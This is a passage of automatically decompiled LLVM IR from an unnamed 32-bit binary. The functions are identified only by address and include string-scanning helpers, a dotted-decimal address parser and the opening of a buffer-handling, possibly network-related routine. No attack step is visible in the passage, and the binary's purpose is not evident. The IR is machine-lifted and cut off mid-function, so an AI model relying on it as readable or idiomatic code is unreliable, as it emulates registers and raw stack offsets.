  %eax.global-to-local = alloca i32, align 4
  %v4_805074b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805074b, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8050757 = icmp eq i8* %arg1, null
  %v1_8050759 = icmp eq i1 %v1_8050757, false
  br i1 %v1_8050759, label %dec_label_pc_805075d, label %dec_label_pc_805075b

dec_label_pc_805075b:                             ; preds = %dec_label_pc_8050748
  %v1_805075b = inttoptr i32 %arg3 to i32*
  %v2_805075b = load i32, i32* %v1_805075b, align 4
  store i32 %v2_805075b, i32* @ebx, align 4
  br label %dec_label_pc_805075d

dec_label_pc_805075d:                             ; preds = %dec_label_pc_8050748, %dec_label_pc_805075b
  %v0_8050760 = phi i32 [ %v4_805074b, %dec_label_pc_8050748 ], [ %v2_805075b, %dec_label_pc_805075b ]
  %v0_805075d = load i32, i32* @ecx, align 4
  %v5_8050760 = inttoptr i32 %v0_8050760 to i8*
  %v8_8050761 = call i32 @function_80516d4(i8* %v5_8050760, i32 %arg2, i32 %v0_805075d, i32 %v0_805075d)
  store i32 %v8_8050761, i32* %eax.global-to-local, align 4
  %v0_8050769 = load i32, i32* @ebx, align 4
  %v2_8050769 = add i32 %v0_8050769, %v8_8050761
  store i32 %v2_8050769, i32* @ebx, align 4
  %v1_805076b = inttoptr i32 %v2_8050769 to i8*
  %v2_805076b = load i8, i8* %v1_805076b, align 1
  %v3_805076b = icmp eq i8 %v2_805076b, 0
  %v1_805076e = icmp eq i1 %v3_805076b, false
  br i1 %v1_805076e, label %dec_label_pc_8050776, label %dec_label_pc_8050770

dec_label_pc_8050770:                             ; preds = %dec_label_pc_805075d
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050772 = load i32, i32* @esi, align 4
  %v2_8050772 = inttoptr i32 %v1_8050772 to i32*
  store i32 %v2_8050769, i32* %v2_8050772, align 4
  %v0_80507a0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805079d

dec_label_pc_8050776:                             ; preds = %dec_label_pc_805075d
  %v0_8050776 = load i32, i32* @edx, align 4
  %v0_8050778 = load i32, i32* @edi, align 4
  %v8_805077a = call i32 @function_80507a4(i8* %v1_805076b, i32 %v0_8050778, i32 %v0_8050776, i32 %v0_8050776)
  store i32 %v8_805077a, i32* %eax.global-to-local, align 4
  %v2_8050782 = icmp eq i32 %v8_805077a, 0
  %v1_8050784 = icmp eq i1 %v2_8050782, false
  br i1 %v1_8050784, label %dec_label_pc_8050795, label %dec_label_pc_8050786

dec_label_pc_8050786:                             ; preds = %dec_label_pc_8050776
  %v0_805078a = load i32, i32* @ebx, align 4
  %v5_805078a = inttoptr i32 %v0_805078a to i8*
  %v8_805078b = call i32 @function_8051670(i8* %v5_805078a, i32 0, i32 %v8_805077a, i32 %v8_805077a)
  br label %dec_label_pc_8050799

dec_label_pc_8050795:                             ; preds = %dec_label_pc_8050776
  %v9_805077a = inttoptr i32 %v8_805077a to i8*
  store i8 0, i8* %v9_805077a, align 1
  %v2_8050798 = add i32 %v8_805077a, 1
  br label %dec_label_pc_8050799

dec_label_pc_8050799:                             ; preds = %dec_label_pc_8050786, %dec_label_pc_8050795
  %storemerge = phi i32 [ %v2_8050798, %dec_label_pc_8050795 ], [ %v8_805078b, %dec_label_pc_8050786 ]
  %v0_8050799 = phi i32 [ %v2_8050798, %dec_label_pc_8050795 ], [ %v8_805078b, %dec_label_pc_8050786 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8050799 = load i32, i32* @esi, align 4
  %v2_8050799 = inttoptr i32 %v1_8050799 to i32*
  store i32 %v0_8050799, i32* %v2_8050799, align 4
  %v0_805079b = load i32, i32* @ebx, align 4
  store i32 %v0_805079b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805079d

dec_label_pc_805079d:                             ; preds = %dec_label_pc_8050770, %dec_label_pc_8050799
  %v0_80507a0 = phi i32 [ %v0_80507a0.pre, %dec_label_pc_8050770 ], [ %v0_805079b, %dec_label_pc_8050799 ]
  ret i32 %v0_80507a0

; uselistorder directives
  uselistorder i32 %v8_805077a, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805079d, { 1, 0 }
  uselistorder label %dec_label_pc_8050799, { 1, 0 }
  uselistorder label %dec_label_pc_805075d, { 1, 0 }
}

define i32 @function_80507a4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80507a4:
  %v0_80507a5 = load i32, i32* @ebx, align 4
  %v2_80507bc24 = load i8, i8* %arg1, align 1
  %v4_80507be28 = icmp eq i8 %v2_80507bc24, 0
  br i1 %v4_80507be28, label %dec_label_pc_80507c6, label %dec_label_pc_80507c2.lr.ph

dec_label_pc_80507c2.lr.ph:                       ; preds = %dec_label_pc_80507a4
  %v3_80507bc25 = zext i8 %v2_80507bc24 to i32
  %v5_80507bc26 = and i32 %v0_80507a5, -256
  %v6_80507bc27 = or i32 %v3_80507bc25, %v5_80507bc26
  %v4_80507aa = ptrtoint i8* %arg1 to i32
  %v1_80507b513 = inttoptr i32 %arg2 to i8*
  %v4_80507b5.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80507c2

dec_label_pc_80507b0:                             ; preds = %dec_label_pc_80507c2, %dec_label_pc_80507b4
  %v6_80507b522 = phi i32 [ %v6_80507b5, %dec_label_pc_80507b4 ], [ %v6_80507b517, %dec_label_pc_80507c2 ]
  %v2_80507b521 = phi i8 [ %v2_80507b5, %dec_label_pc_80507b4 ], [ %v2_80507b514, %dec_label_pc_80507c2 ]
  %v0_80507b420 = phi i32 [ %v1_80507b4, %dec_label_pc_80507b4 ], [ %arg2, %dec_label_pc_80507c2 ]
  %v15_80507b0 = icmp eq i8 %v2_80507b521, %v2_80507bc31
  br i1 %v15_80507b0, label %dec_label_pc_80507c8, label %dec_label_pc_80507b4

dec_label_pc_80507b4:                             ; preds = %dec_label_pc_80507b0
  %v1_80507b4 = add i32 %v0_80507b420, 1
  %v1_80507b5 = inttoptr i32 %v1_80507b4 to i8*
  %v2_80507b5 = load i8, i8* %v1_80507b5, align 1
  %v3_80507b5 = zext i8 %v2_80507b5 to i32
  %v5_80507b5 = and i32 %v6_80507b522, -256
  %v6_80507b5 = or i32 %v3_80507b5, %v5_80507b5
  %v4_80507b7 = icmp eq i8 %v2_80507b5, 0
  %v1_80507b9 = icmp eq i1 %v4_80507b7, false
  br i1 %v1_80507b9, label %dec_label_pc_80507b0, label %dec_label_pc_80507bb

dec_label_pc_80507bb:                             ; preds = %dec_label_pc_80507b4, %dec_label_pc_80507c2
  %v4_80507b5.pre34 = phi i32 [ %v6_80507b517, %dec_label_pc_80507c2 ], [ %v6_80507b5, %dec_label_pc_80507b4 ]
  %v1_80507bb = add i32 %v0_80507bb29, 1
  %v1_80507bc = inttoptr i32 %v1_80507bb to i8*
  %v2_80507bc = load i8, i8* %v1_80507bc, align 1
  %v3_80507bc = zext i8 %v2_80507bc to i32
  %v5_80507bc = and i32 %v6_80507bc32, -256
  %v6_80507bc = or i32 %v3_80507bc, %v5_80507bc
  %v4_80507be = icmp eq i8 %v2_80507bc, 0
  br i1 %v4_80507be, label %dec_label_pc_80507c6, label %dec_label_pc_80507c2

dec_label_pc_80507c2:                             ; preds = %dec_label_pc_80507c2.lr.ph, %dec_label_pc_80507bb
  %v4_80507b5.pre = phi i32 [ %v4_80507b5.pre.pre, %dec_label_pc_80507c2.lr.ph ], [ %v4_80507b5.pre34, %dec_label_pc_80507bb ]
  %v6_80507bc32 = phi i32 [ %v6_80507bc27, %dec_label_pc_80507c2.lr.ph ], [ %v6_80507bc, %dec_label_pc_80507bb ]
  %v2_80507bc31 = phi i8 [ %v2_80507bc24, %dec_label_pc_80507c2.lr.ph ], [ %v2_80507bc, %dec_label_pc_80507bb ]
  %v0_80507bb29 = phi i32 [ %v4_80507aa, %dec_label_pc_80507c2.lr.ph ], [ %v1_80507bb, %dec_label_pc_80507bb ]
  %v2_80507b514 = load i8, i8* %v1_80507b513, align 1
  %v3_80507b515 = zext i8 %v2_80507b514 to i32
  %v5_80507b516 = and i32 %v4_80507b5.pre, -256
  %v6_80507b517 = or i32 %v3_80507b515, %v5_80507b516
  %v4_80507b718 = icmp eq i8 %v2_80507b514, 0
  %v1_80507b919 = icmp eq i1 %v4_80507b718, false
  br i1 %v1_80507b919, label %dec_label_pc_80507b0, label %dec_label_pc_80507bb

dec_label_pc_80507c6:                             ; preds = %dec_label_pc_80507bb, %dec_label_pc_80507a4
  br label %dec_label_pc_80507c8

dec_label_pc_80507c8:                             ; preds = %dec_label_pc_80507b0, %dec_label_pc_80507c6
  %v0_80507ca = phi i32 [ 0, %dec_label_pc_80507c6 ], [ %v0_80507bb29, %dec_label_pc_80507b0 ]
  store i32 %v0_80507a5, i32* @ebx, align 4
  ret i32 %v0_80507ca

; uselistorder directives
  uselistorder i8 %v2_80507b514, { 1, 2, 0 }
  uselistorder i32 %v1_80507bb, { 1, 0 }
  uselistorder i32 %v6_80507b5, { 1, 0 }
  uselistorder i8 %v2_80507b5, { 1, 2, 0 }
  uselistorder i32 %v1_80507b4, { 1, 0 }
  uselistorder i8 %v2_80507bc24, { 0, 2, 1 }
  uselistorder i32 %v0_80507a5, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80507c8, { 1, 0 }
  uselistorder label %dec_label_pc_80507c2, { 1, 0 }
  uselistorder label %dec_label_pc_80507bb, { 1, 0 }
}

define i32 @function_80507cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80507cc:
  %v4_80507d3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80507d3, i32* @ecx, align 4
  %v1_80507d7 = icmp eq i8* %arg1, null
  br i1 %v1_80507d7, label %dec_label_pc_8050858, label %dec_label_pc_80507db

dec_label_pc_80507db:                             ; preds = %dec_label_pc_80507cc
  %v0_80507e9.pre = load i32, i32* @global_var_8056080, align 128
  br label %dec_label_pc_80507e6

dec_label_pc_80507e6:                             ; preds = %dec_label_pc_80507db, %dec_label_pc_805082f
  %v2_805083236 = phi i32 [ 1, %dec_label_pc_80507db ], [ %v3_8050832, %dec_label_pc_805082f ]
  %v0_80507e635 = phi i32 [ %v4_80507d3, %dec_label_pc_80507db ], [ %v0_80507e64, %dec_label_pc_805082f ]
  %v0_805084d34 = phi i32 [ 0, %dec_label_pc_80507db ], [ %v2_8050835, %dec_label_pc_805082f ]
  %v1_80507e6 = inttoptr i32 %v0_80507e635 to i8*
  %v2_80507e6 = load i8, i8* %v1_80507e6, align 1
  %v3_80507e6 = sext i8 %v2_80507e6 to i32
  %v2_80507ef = mul nsw i32 %v3_80507e6, 2
  %v3_80507ef = add i32 %v2_80507ef, %v0_80507e9.pre
  %v4_80507ef = inttoptr i32 %v3_80507ef to i8*
  %v5_80507ef = load i8, i8* %v4_80507ef, align 1
  %v6_80507ef = and i8 %v5_80507ef, 8
  %v7_80507ef = icmp eq i8 %v6_80507ef, 0
  br i1 %v7_80507ef, label %dec_label_pc_8050858, label %dec_label_pc_80507f6

dec_label_pc_80507f6:                             ; preds = %dec_label_pc_80507e6
  %v4_805080a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805080a

dec_label_pc_80507fa:                             ; preds = %dec_label_pc_805080a
  %v3_80507fa = mul i32 %v1_80507fa, 10
  %v2_80507fd = add i32 %v3_80507fa, -48
  %v3_80507fd = add i32 %v2_80507fd, %v2_805080c
  %v1_8050801 = add i32 %v3_80507fd, -255
  %v6_8050801 = sub i32 254, %v3_80507fd
  %v7_8050801 = and i32 %v6_8050801, %v3_80507fd
  %v8_8050801 = icmp slt i32 %v7_8050801, 0
  %v9_8050801 = icmp eq i32 %v1_8050801, 0
  %v10_8050801 = icmp slt i32 %v1_8050801, 0
  %v3_8050807 = icmp eq i1 %v10_8050801, %v8_8050801
  %v4_8050807 = icmp eq i1 %v9_8050801, false
  %v5_8050807 = and i1 %v4_8050807, %v3_8050807
  br i1 %v5_8050807, label %dec_label_pc_8050858, label %dec_label_pc_8050809

dec_label_pc_8050809:                             ; preds = %dec_label_pc_80507fa
  %v1_8050809 = add i32 %v0_8050809, 1
  store i32 %v1_8050809, i32* @ecx, align 4
  br label %dec_label_pc_805080a

dec_label_pc_805080a:                             ; preds = %dec_label_pc_80507f6, %dec_label_pc_8050809
  %v1_80507fa = phi i32 [ 0, %dec_label_pc_80507f6 ], [ %v3_80507fd, %dec_label_pc_8050809 ]
  %v4_805080a = phi i32 [ %v4_805080a.pre, %dec_label_pc_80507f6 ], [ %v6_805080a, %dec_label_pc_8050809 ]
  %v0_8050809 = phi i32 [ %v0_80507e635, %dec_label_pc_80507f6 ], [ %v1_8050809, %dec_label_pc_8050809 ]
  %v1_805080a = inttoptr i32 %v0_8050809 to i8*
  %v2_805080a = load i8, i8* %v1_805080a, align 1
  %v3_805080a = zext i8 %v2_805080a to i32
  %v5_805080a = and i32 %v4_805080a, -256
  %v6_805080a = or i32 %v3_805080a, %v5_805080a
  store i32 %v6_805080a, i32* @edx, align 4
  %v2_805080c = sext i8 %v2_805080a to i32
  %v2_805080f = mul nsw i32 %v2_805080c, 2
  %v3_805080f = add i32 %v2_805080f, %v0_80507e9.pre
  %v4_805080f = inttoptr i32 %v3_805080f to i16*
  %v5_805080f = load i16, i16* %v4_805080f, align 2
  %v2_8050814 = and i16 %v5_805080f, 8
  %v3_8050814 = icmp eq i16 %v2_8050814, 0
  %v1_8050816 = icmp eq i1 %v3_8050814, false
  br i1 %v1_8050816, label %dec_label_pc_80507fa, label %dec_label_pc_8050818

dec_label_pc_8050818:                             ; preds = %dec_label_pc_805080a
  %v8_8050818 = sub nsw i32 2, %v2_805083236
  %v9_8050818 = and i32 %v8_8050818, %v2_805083236
  %v10_8050818 = icmp slt i32 %v9_8050818, 0
  %v11_8050818 = icmp eq i32 %v2_805083236, 3
  %v12_8050818 = icmp slt i32 %v2_805083236, 3
  %v3_805081c = icmp eq i1 %v12_8050818, %v10_8050818
  %v4_805081c = icmp eq i1 %v11_8050818, false
  %v5_805081c = and i1 %v4_805081c, %v3_805081c
  br i1 %v5_805081c, label %dec_label_pc_8050826, label %dec_label_pc_805081e

dec_label_pc_805081e:                             ; preds = %dec_label_pc_8050818
  %v10_805081e = icmp eq i8 %v2_805080a, 46
  %v1_8050821 = icmp eq i1 %v10_805081e, false
  br i1 %v1_8050821, label %dec_label_pc_8050858, label %dec_label_pc_8050823

dec_label_pc_8050823:                             ; preds = %dec_label_pc_805081e
  %v1_8050823 = add i32 %v0_8050809, 1
  store i32 %v1_8050823, i32* @ecx, align 4
  br label %dec_label_pc_805082f

dec_label_pc_8050826:                             ; preds = %dec_label_pc_8050818
  %v1_8050826 = add i32 %v0_8050809, 1
  store i32 %v1_8050826, i32* @ecx, align 4
  %v4_8050827 = icmp eq i8 %v2_805080a, 0
  br i1 %v4_8050827, label %dec_label_pc_805082f, label %dec_label_pc_805082b

dec_label_pc_805082b:                             ; preds = %dec_label_pc_8050826
  %v2_805082b = and i16 %v5_805080f, 32
  %v3_805082b = icmp eq i16 %v2_805082b, 0
  br i1 %v3_805082b, label %dec_label_pc_8050858, label %dec_label_pc_805082f

dec_label_pc_805082f:                             ; preds = %dec_label_pc_805082b, %dec_label_pc_8050826, %dec_label_pc_8050823
  %v0_80507e64 = phi i32 [ %v1_8050826, %dec_label_pc_805082b ], [ %v1_8050826, %dec_label_pc_8050826 ], [ %v1_8050823, %dec_label_pc_8050823 ]
  %v2_805082f = mul i32 %v0_805084d34, 256
  %v3_8050832 = add nuw nsw i32 %v2_805083236, 1
  %v2_8050835 = or i32 %v1_80507fa, %v2_805082f
  %v7_805083b = icmp sgt i32 %v2_805083236, 3
  br i1 %v7_805083b, label %dec_label_pc_805083d, label %dec_label_pc_80507e6

dec_label_pc_805083d:                             ; preds = %dec_label_pc_805082f
  %v4_8050842 = icmp eq i32 %arg2, 0
  br i1 %v4_8050842, label %dec_label_pc_805085a, label %dec_label_pc_8050849

dec_label_pc_8050849:                             ; preds = %dec_label_pc_805083d
  %v1_805084d = call i32 @llvm.bswap.i32(i32 %v2_8050835)
  %v2_805084f = inttoptr i32 %arg2 to i32*
  store i32 %v1_805084d, i32* %v2_805084f, align 4
  br label %dec_label_pc_805085a

dec_label_pc_8050858:                             ; preds = %dec_label_pc_805082b, %dec_label_pc_805081e, %dec_label_pc_80507e6, %dec_label_pc_80507fa, %dec_label_pc_80507cc
  br label %dec_label_pc_805085a

dec_label_pc_805085a:                             ; preds = %dec_label_pc_805083d, %dec_label_pc_8050849, %dec_label_pc_8050858
  %v0_805085f = phi i32 [ 1, %dec_label_pc_805083d ], [ 1, %dec_label_pc_8050849 ], [ 0, %dec_label_pc_8050858 ]
  ret i32 %v0_805085f

; uselistorder directives
  uselistorder i32 %v2_805080c, { 1, 0 }
  uselistorder i32 %v6_805080a, { 1, 0 }
  uselistorder i8 %v2_805080a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050809, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050801, { 1, 0 }
  uselistorder i32 %v3_80507fd, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80507e635, { 1, 0 }
  uselistorder i32 %v2_805083236, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805085a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050858, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805080a, { 1, 0 }
  uselistorder label %dec_label_pc_80507e6, { 1, 0 }
}

define i32 @function_8050860(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8050860:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 512, i32* %stack_var_-252, align 4
  %v1_8050876 = call i32 @function_804da52(i32 512)
  store i32 %v1_8050876, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-252, align 4
  store i32 %v1_8050876, i32* @ebp, align 4
  %v1_8050884 = call i32 @function_804da52(i32 1025)
  store i32 %v1_8050884, i32* %eax.global-to-local, align 4
  %v12_805088d = ptrtoint i32* %stack_var_-236 to i32
  %v1_8050890 = icmp eq i32 %v1_8050876, 0
  br i1 %v1_8050890, label %dec_label_pc_8050f09, label %dec_label_pc_8050898

dec_label_pc_8050898:                             ; preds = %dec_label_pc_8050860
  %v1_8050898 = icmp eq i32 %v1_8050884, 0
  br i1 %v1_8050898, label %dec_label_pc_8050f09, label %dec_label_pc_80508a0

dec_label_pc_80508a0:                             ; preds = %dec_label_pc_8050898
  %v5_80508a0 = icmp eq i32 %arg2, 0
  br i1 %v5_80508a0, label %dec_label_pc_8050f09, label %dec_label_pc_80508ae

dec_label_pc_80508ae:                             ; preds = %dec_label_pc_80508a0
  %v4_80508ae = ptrtoint i8* %arg1 to i32
  store i32 %v4_80508ae, i32* %eax.global-to-local, align 4
  %v2_80508b5 = load i8, i8* %arg1, align 1
  %v3_80508b5 = icmp eq i8 %v2_80508b5, 0
  br i1 %v3_80508b5, label %dec_label_pc_8050f09, label %dec_label_pc_80508be

dec_label_pc_80508be:                             ; preds = %dec_label_pc_80508ae
  store i32 %v4_80508ae, i32* %stack_var_-252, align 4
  %v2_80508c2 = call i32 @function_804d1ac(i8* nonnull %arg1)
  store i32 %v2_80508c2, i32* @eax, align 4
  store i32 %v4_80508ae, i32* %edx.global-to-local, align 4
  %v2_80508e5 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80508e5, i32* @ebx, align 4
  store i32 %v2_80508e5, i32* %stack_var_-252, align 4
  %v2_80508ed = call i32 @function_804f2ae(i32 %v2_80508e5, i32 134541995)
  store i32 %v2_80508ed, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058768.194 to i32), i32* %stack_var_-252, align 4
  %v1_80508f9 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8058768.194 to i32))
  %v0_80508fe = load i64, i64* @global_var_8058780.195, align 8
  %v1_80508fe = trunc i64 %v0_80508fe to i32
  %v1_8050903 = ashr i32 %v1_80508fe, 31
  %v6_8050904 = and i64 %v0_80508fe, 4294967295
  %v8_8050904 = zext i32 %v1_8050903 to i64
  %v9_8050904 = mul nuw i64 %v8_8050904, 4294967296
  %v10_8050904 = or i64 %v9_8050904, %v6_8050904
  %v14_8050904 = srem i64 %v10_8050904, %tmp33
  %v15_8050904 = trunc i64 %v14_8050904 to i32
  %v0_805090b = load i16, i16* @global_var_805608c.196, align 4
  %v2_805091a = load i32, i32* %stack_var_-252, align 4
  store i32 %v2_805091a, i32* @eax, align 4
  store i32 134541995, i32* %edx.global-to-local, align 4
  store i32 %v2_80508e5, i32* %stack_var_-252, align 4
  %v2_805091f = call i32 @function_804f2ae(i32 %v2_80508e5, i32 1)
  store i32 %v2_805091f, i32* %eax.global-to-local, align 4
  %v3_8050963 = sext i16 %v0_805090b to i32
  %v5_8050ac6 = inttoptr i32 %v15_8050904 to i8*
  %v1_8050ee486 = add i32 %v12_805088d, 28
  %v2_8050ee487 = inttoptr i32 %v1_8050ee486 to i32*
  %v3_8050ee488 = load i32, i32* %v2_8050ee487, align 4
  %tmp118 = icmp ult i32 %v3_8050ee488, 3
  br i1 %tmp118, label %dec_label_pc_8050944, label %dec_label_pc_8050f09

dec_label_pc_8050944:                             ; preds = %dec_label_pc_80508be, %dec_label_pc_8050ee4.backedge
  %v0_805094b91 = phi i32 [ %v0_8050ee4.pre, %dec_label_pc_8050ee4.backedge ], [ %v12_805088d, %dec_label_pc_80508be ]
  %v1_8050944 = add i32 %v0_805094b91, 20
  %v2_8050944 = inttoptr i32 %v1_8050944 to i32*
  %v3_8050944 = load i32, i32* %v2_8050944, align 4
  %v13_8050944 = icmp eq i32 %v3_8050944, -1
  br i1 %v13_8050944, label %dec_label_pc_8050944.dec_label_pc_805095a_crit_edge, label %dec_label_pc_805094b

dec_label_pc_8050944.dec_label_pc_805095a_crit_edge: ; preds = %dec_label_pc_8050944
  %v0_805095a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805095a

dec_label_pc_805094b:                             ; preds = %dec_label_pc_8050944
  %v3_805094e = load i32, i32* %v2_8050944, align 4
  %v5_805094e = add i32 %v0_805094b91, -16
  %v6_805094e = inttoptr i32 %v5_805094e to i32*
  store i32 %v3_805094e, i32* %v6_805094e, align 4
  %v1_8050952 = call i32 @function_804b4a4(i32 -1)
  store i32 %v1_8050952, i32* %eax.global-to-local, align 4
  %v0_8050957 = load i32, i32* @esp, align 4
  %v1_8050957 = add i32 %v0_8050957, 16
  br label %dec_label_pc_805095a

dec_label_pc_805095a:                             ; preds = %dec_label_pc_8050944.dec_label_pc_805095a_crit_edge, %dec_label_pc_805094b
  %v1_805095a = phi i32 [ %v0_805094b91, %dec_label_pc_8050944.dec_label_pc_805095a_crit_edge ], [ %v1_8050957, %dec_label_pc_805094b ]
  %v0_805095a = phi i32 [ %v0_805095a.pre, %dec_label_pc_8050944.dec_label_pc_805095a_crit_edge ], [ %v1_8050952, %dec_label_pc_805094b ]
  %v2_805095a = add i32 %v1_805095a, -4
  %v3_805095a = inttoptr i32 %v2_805095a to i32*
  store i32 %v0_805095a, i32* %v3_805095a, align 4
  %v1_805095b = add i32 %v1_805095a, -8
  %v2_805095b = inttoptr i32 %v1_805095b to i32*
  store i32 512, i32* %v2_805095b, align 4
  %v1_8050960 = add i32 %v1_805095a, -12
  %v2_8050960 = inttoptr i32 %v1_8050960 to i32*
  store i32 0, i32* %v2_8050960, align 4
  %v2_8050962 = add i32 %v1_805095a, -16
  %v3_8050962 = inttoptr i32 %v2_8050962 to i32*
  store i32 %v1_8050876, i32* %v3_8050962, align 4
  %v5_8050963 = call i32 @function_804d178(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050904, i32 %v3_8050963)
  store i32 %v5_8050963, i32* %eax.global-to-local, align 4
  %v0_8050968 = load i32, i32* @esp, align 4
  %v1_805096b = add i32 %v0_8050968, 8
  %v2_805096b = inttoptr i32 %v1_805096b to i32*
  store i32 48, i32* %v2_805096b, align 4
  %v1_805096d = add i32 %v0_8050968, 4
  %v2_805096d = inttoptr i32 %v1_805096d to i32*
  store i32 0, i32* %v2_805096d, align 4
  %v1_805096f = add i32 %v0_8050968, 84
  store i32 %v1_805096f, i32* @ebx, align 4
  %v3_8050973 = inttoptr i32 %v0_8050968 to i32*
  store i32 %v1_805096f, i32* %v3_8050973, align 4
  %v5_8050974 = call i32 @function_804d178(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050904, i32 %v3_8050963)
  store i32 %v5_8050974, i32* %eax.global-to-local, align 4
  %v0_8050979 = load i32, i32* @esp, align 4
  %v1_8050979 = add i32 %v0_8050979, 60
  %v2_8050979 = inttoptr i32 %v1_8050979 to i32*
  %v3_8050979 = load i32, i32* %v2_8050979, align 4
  store i32 %v3_8050979, i32* %eax.global-to-local, align 4
  %v1_805097d = add i32 %v0_8050979, 116
  %v2_805097d = inttoptr i32 %v1_805097d to i32*
  store i32 1, i32* %v2_805097d, align 4
  %v0_8050985 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050985 = add i32 %v0_8050985, 1
  %v0_8050986 = load i32, i32* @esp, align 4
  %v1_8050986 = add i32 %v0_8050986, 104
  %v2_8050986 = inttoptr i32 %v1_8050986 to i32*
  store i32 1, i32* %v2_8050986, align 4
  %v1_805098e = urem i32 %v1_8050985, 65536
  store i32 %v1_805098e, i32* %eax.global-to-local, align 4
  %v1_8050993 = load i32, i32* @esp, align 4
  %v2_8050993 = add i32 %v1_8050993, 60
  %v3_8050993 = inttoptr i32 %v2_8050993 to i32*
  store i32 %v1_805098e, i32* %v3_8050993, align 4
  %v0_8050997 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050997 = load i32, i32* @esp, align 4
  %v2_8050997 = add i32 %v1_8050997, 84
  %v3_8050997 = inttoptr i32 %v2_8050997 to i32*
  store i32 %v0_8050997, i32* %v3_8050997, align 4
  %v0_805099b = load i32, i32* @esp, align 4
  %v1_805099e = add i32 %v0_805099b, 8
  %v2_805099e = inttoptr i32 %v1_805099e to i32*
  store i32 512, i32* %v2_805099e, align 4
  %v2_80509a3 = add i32 %v0_805099b, 4
  %v3_80509a3 = inttoptr i32 %v2_80509a3 to i32*
  store i32 %v1_8050876, i32* %v3_80509a3, align 4
  %v0_80509a4 = load i32, i32* @ebx, align 4
  %v3_80509a4 = inttoptr i32 %v0_805099b to i32*
  store i32 %v0_80509a4, i32* %v3_80509a4, align 4
  %v0_80509a5 = call i32 @function_8051c30()
  store i32 %v0_80509a5, i32* %eax.global-to-local, align 4
  %v0_80509aa = load i32, i32* @esp, align 4
  store i32 %v0_80509a5, i32* @ebx, align 4
  %v2_80509af = icmp slt i32 %v0_80509a5, 0
  br i1 %v2_80509af, label %dec_label_pc_8050f09, label %dec_label_pc_80509b7

dec_label_pc_80509b7:                             ; preds = %dec_label_pc_805095a
  %v2_80509b7 = add i32 %v0_80509aa, 12
  %v3_80509b7 = inttoptr i32 %v2_80509b7 to i32*
  store i32 %v0_80509a5, i32* %v3_80509b7, align 4
  %v1_80509b8 = add i32 %v0_80509aa, 8
  %v2_80509b8 = inttoptr i32 %v1_80509b8 to i32*
  store i32 1025, i32* %v2_80509b8, align 4
  %v1_80509bd = add i32 %v0_80509aa, 256
  %v2_80509bd = inttoptr i32 %v1_80509bd to i32*
  %v3_80509bd = load i32, i32* %v2_80509bd, align 4
  %v5_80509bd = add i32 %v0_80509aa, 4
  %v6_80509bd = inttoptr i32 %v5_80509bd to i32*
  store i32 %v3_80509bd, i32* %v6_80509bd, align 4
  %v1_80509c4 = add i32 %v0_80509aa, 28
  %v2_80509c4 = inttoptr i32 %v1_80509c4 to i32*
  %v3_80509c4 = load i32, i32* %v2_80509c4, align 4
  %v6_80509c4 = inttoptr i32 %v0_80509aa to i32*
  store i32 %v3_80509c4, i32* %v6_80509c4, align 4
  %v5_80509c8 = call i32 @function_804d1c0(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050904, i32 %v3_8050963)
  %v0_80509cd = load i32, i32* @esp, align 4
  %v1_80509d0 = add i32 %v0_80509cd, 8
  %v2_80509d0 = inttoptr i32 %v1_80509d0 to i32*
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %v2_80509d0, align 4
  %v1_80509d5 = add i32 %v0_80509cd, 4
  %v2_80509d5 = inttoptr i32 %v1_80509d5 to i32*
  store i32 134541995, i32* %v2_80509d5, align 4
  %v1_80509da = add i32 %v0_80509cd, 200
  store i32 %v1_80509da, i32* @eax, align 4
  %v3_80509e1 = inttoptr i32 %v0_80509cd to i32*
  store i32 %v1_80509da, i32* %v3_80509e1, align 4
  %v2_80509e2 = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_80509e2, i32* %eax.global-to-local, align 4
  %v0_80509e7 = load i32, i32* @esp, align 4
  %v1_80509e7 = inttoptr i32 %v0_80509e7 to i32*
